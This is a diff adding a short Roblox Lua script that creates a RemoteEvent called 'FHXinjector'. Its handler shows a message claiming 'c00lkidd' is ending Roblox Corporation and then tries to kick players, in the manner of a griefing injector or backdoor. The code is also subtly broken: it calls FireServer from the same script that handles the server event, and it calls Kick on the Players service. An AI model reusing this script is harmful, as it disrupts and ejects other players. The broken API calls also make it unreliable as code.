@@ -1,0 +1,12 @@
+local RE = Instance.new("RemoteEvent")
+RE.Name = "FHXinjector"
+RE.Parent = game.ReplicatedStorage
+local FHX = game.ReplicatedStorage.FHXinjector
+FHX.OnServerEvent:Connect(function()
+    local M = Instance.new("Message", workspace)
+    M.Text = "Hello, my name is c00lkidd and it's the end of Roblox Corporation"
+    wait(10)
+    M:Destroy()
+    game.Players:Kick("Goodbye...")
+end)
+FHX:FireServer()
